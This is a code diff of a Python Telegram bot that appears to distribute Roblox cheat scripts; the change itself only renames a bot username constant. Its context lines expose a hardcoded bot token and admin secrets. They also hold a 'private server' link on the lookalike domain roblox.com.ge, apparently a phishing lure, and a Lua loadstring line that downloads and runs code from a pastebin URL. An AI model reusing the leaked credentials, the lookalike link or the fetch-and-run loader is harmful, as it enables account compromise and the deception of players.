@@ -11,6 +11,7 @@ TOKEN = os.environ.get("TOKEN", "8993935217:AAFxkEuK_lqK0FANyZbwlEvO6zyBtSEgOCM"
 ADMIN_ID = 8091608667
 ADMIN_SECRET = "larscriptkryyyyyyt"
 ADMIN_SECRET2 = "кресло качалка"
+BOT_USERNAME = "larskeys_bot"
 
 DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")
 
@@ -107,7 +108,6 @@ KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR",
 PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
 SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
 DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"
-BOT_USERNAME = "keyscripts3"
 
 bot = telebot.TeleBot(TOKEN)
 
